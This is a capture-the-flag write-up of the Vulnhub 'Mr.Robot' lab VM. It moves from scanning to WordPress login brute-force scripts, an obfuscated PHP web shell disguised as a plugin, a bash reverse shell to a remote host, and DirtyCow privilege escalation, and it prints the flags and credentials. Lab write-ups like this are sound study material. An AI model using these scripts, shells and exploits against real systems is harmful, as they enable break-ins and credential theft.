---
title: "Vulnhub - Mr.Robot Writeup"
date: 2019-06-05T13:02:53+08:00
description: ""
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Download here

Target VM: https://download.vulnhub.com/mrrobot/mrRobot.ova

Difficulty: Beginner-Intermediate

After you download it, just import to your VMWare workstation and change the network interface type as you pleased. Network is configured via DHCP.

# Before Start

Prepare your Kali and ensure they are in the same subnet.

Open VMware workstation - Edit - Virtual network editor to get the ip range.

## Check VM IP

`nmap -sn -n 172.16.51.0/24`, found: 172.16.51.132

# GOGOGO

## Check footprint

> sudo nmap -sC -sC -oN mrbot -p1-65535 -O 172.16.51.132

Found 80,443. Nothing useful.

> sudo nikto -o ./mrrbt.txt -h 172.16.51.132 -p 80 

Found wordpress.

> gobuster -u http://172.16.51.132 -w /media/kmahyyg/linuxdata/WorkData/HostedOnGithub/hackbox_tools/utils/outsidetools/dictionaries/DirBuster-Lists/directory-list-2.3-medium.txt -x php,html,txt,html -o mrrbot.txt

Well, there's a lot of rabbit holes. But just check StatusCode == 200

> wpscan --url http://172.16.51.132 -o ./mrbot-wpscan.txt

Wordpress scanned.

## Flag 1: robots.txt

A key file is listed and a dictionary is offered. Download them all, you get the first key.

## Flag 2

### Wordpress bruteforce

You got a dictionary. Then next? Yes, try to bruteforce.

First, try `hydra`, however, it's really slow here. 

I just write a simple Python3 script to make it much more faster.

```python3
#!/usr/bin/env python3
import requests
wordlist = open("fsocity.dic").readlines()
set = set(wordlist) # REMOVE DUPLICATES
tot = len(set)
i = 0
for w in set:
    print("{current}/{total}".format(i, tot))
    r = requests.post("http://172.16.51.132/wp-login.php", data={'log': w, 'pwd': “dummy”})
    if "Invalid username" not in r.text:
        print("USERNAME:")
        print(w)
        exit(0)
    i += 1
```


Found username: elliot

Then, Let's bruteforce the password.

```python3
#!/usr/bin/env python3
import requests
wordlist = open("fsocity.dic").readlines()
set = set(wordlist) # REMOVE DUPLICATES
tot = len(set)
i = 0
for w in set:
    print("{current_time}/{total}".format(current_time=i, total=tot))
    r = requests.post("http://172.16.51.132/wp-login.php", data={"log": "elliot", "pwd": w})
    if "is incorrect" not in r.text:
        print("password:")
        print(w)
        exit(0)
    i += 1
```

Found password: ER28-0652

After you login, check all the place you can access.

Then, You found nothing. But you can upload one plugin you love.

### Get RCE

You just use AntSword to add this shell and run it.

Example: I saved the shell code into `neshell.php` and then pack it in zip file `shitwps.zip`, then upload but **NOT ACTIVATE** .

URL: http://172.16.51.132/wp-content/plugins/shitwps/neshell.php

```
<?php
    /*
    Plugin Name: AntSword Shell
    Plugin URI: https://github.com/leonjza/wordpress-shell
    Description: Inspired by leonjza, This shell plugin is generated by Antsword.
    Author: Patrick Young
    Version: 0.1
    Author URI: https://www.kmahyyg.xyz
    */?>
<?php $JWgG=create_function(str_rot13('$').str_rot13('f').chr(01501-01322).str_rot13('z').base64_decode('ZQ=='),chr(0x13b3b/0x31f).base64_decode('dg==').chr(0610-0447).chr(56700/525).base64_decode('KA==').chr(01501-01435).chr(0x39d-0x32a).chr(68598/618).chr(0162070/01030).str_rot13('r').str_rot13(')').chr(0354-0261));$JWgG(base64_decode('NjMxN'.'Dc1O0'.'BldkF'.'sKCRf'.''.chr(0xcc88/0x268).base64_decode('RQ==').chr(14877/261).base64_decode('VA==').str_rot13('I').''.''.str_rot13('S').chr(603-487).base64_decode('bw==').chr(0152522/01173).chr(0x16f-0x102).''.'pxbGp'.'Jbl0p'.'OzE4O'.'TQ0Mj'.'U7'.''));?>
```

Work as intended. After you get shell in User `daemon`.

Get user by `cat /etc/passwd`, then you found a User `robot`, and try next to read home `/home/robot`, you will only find a password md5 and login via SSH to get the second flag.

The credential is: `robot:c3fcd3d76192e4007dfb496cca67e13b`

It's a md5sum, just use [Hashkiller](https://hashkiller.co.uk/Cracker/MD5) to crack, you find this `abcdefghijklmnopqrstuvwxyz`.

However, you cannot login...... 

According to OSCP Rules, `metasploit` automated exploit is not allowed. So 

```bash
$ bash -c 'bash -i &>/dev/tcp/192.168.1.69/4433 0<&1'
```

Reverse shell got with `nc -lvp 4433` before you issue the command above.

Then use `whereis python3` to check if Python is working. Got `Python 3.4`.

Next, Spawn a tty to login.

```
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
```

After you get a tty, then `su robot` and login.

Second flag get: `822c73956184f694993bede3eb39f959`

## Flag 3

### Privilege Escalation

After LinEnum, found nothing but kernel version is 3.13.0-55 with Ubuntu 14.04-LTS and you have `gcc-4.8`.

Well, so if you got `gcc` with such an old kernel version, you will love DirtyCow.

After some Google-fu,  Before **3.13.0-100.147** in Ubuntu 14.04 , all version are effected.

So, directly DirtyCow. The most conveninent one is exploitdb-ID-40616, you should get this source code via searchsploit:

```bash
$ searchsploit -m 40616
```

Next, Open a http server in Python3 `python3 -m http.server 8080` and just wget it in victim `wget http://192.168.1.56/40616.c` to a writable folder `/tmp` , and then compile it via GCC `gcc cowroot.c -o cowroot -pthread` and then run it `./cowroot` to get root shell, after you get root, run `echo 0 > /proc/sys/vm/dirty_writeback_centisecs` to make the shell more stable, then do anything you love, the third key is located at `/root/key-3-of-3.txt`.

Third Key, get: `04787ddef27c3dee1ee161b21670b4e4`.

# Clean UP

DIRECTLY FORCE POWER OFF AFTER YOU FINISHED DIRTYCOW!

(FINISHED)
